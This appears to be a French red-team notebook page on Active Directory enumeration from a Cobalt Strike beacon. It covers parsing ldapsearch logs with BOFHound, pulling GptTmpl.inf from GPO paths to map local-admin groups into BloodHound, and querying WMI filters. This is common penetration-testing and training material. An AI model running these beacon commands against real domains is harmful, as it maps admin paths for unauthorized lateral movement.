
Script Python qui permet de parser les logs ldapsearch dans Cobalt Strike.



## Parser les requêtes

Nécessite de transférer les logs sur notre machine locale

Depuis WSL :

```
cd /mnt/c/Users/Attacker/Desktop
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
```

Puis lancer BOFHound sur les logs

```
bofhound -i logs/
```

Cela génère des fichiers json à importer dans BloodHound.



## Groupes restreints

Identifier les Admins locaux des computers

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada1/6eb770b7-0c89-4a3e-a41e-2807d46880d8


1. Dans bloodhound, afficher toutes les GPOs grâce aux cypher queries

```cypher
Match (n:GPO) return n
```

2. Identifier le gpcpath de la GPO cible et le noter

![[Pasted image 20250915025103.png]]

3. Cliquer sur Affected Objects -> Computers, puis cliquer sur le computers pour noter leur SID

![[Pasted image 20250915025420.png]]


Depuis un beacon, afficher le fichier GptTmpl.inf dans le Gpcpath\Machine\Microsoft\Windows NT\SecEdit\

```
ls <gpcpath>\Machine\Microsoft\Windows NT\SecEdit\
```

Télécharger le fichier GptTmpl.inf qui contient les groups membership

```
download <gpcpath>\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

Synchroniser le fichier sur notre machine locale -> View -> Downloads -> Sync

L'ouvrir et noter le SID membre de *S-1-5-32-544.

```
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Group Membership]
*S-1-5-21-3926355307-1661546229-813047887-1107__Memberof = *S-1-5-32-544 > built in admin group
*S-1-5-21-3926355307-1661546229-813047887-1107__Members =
```

Mapper les groupes identifiés comme Administrateur local aux computers affectés par la GPO

```
MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-1110'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1107'})
MERGE (y)-[:AdminTo]->(x)
```


## Filtres WMI

Les filtres WMI servent à filtrer l'application d'une GPO sur une OU en fonction de critères définis. (version de windows, nom spécifique etc...)


Afficher les filtres WMI appliqués sur les GPO

```
ldapsearch (objectClass=groupPolicyContainer) --attributes displayname,gPCWQLFilter
```

Afficher tous les filtres WMI existants

```
ldapsearch (objectClass=msWMI-Som) --attributes name,msWMI-Name,msWMI-Parm2 --dn "CN=SOM,CN=WMIPolicy,CN=System,DC=contoso,DC=com"
```
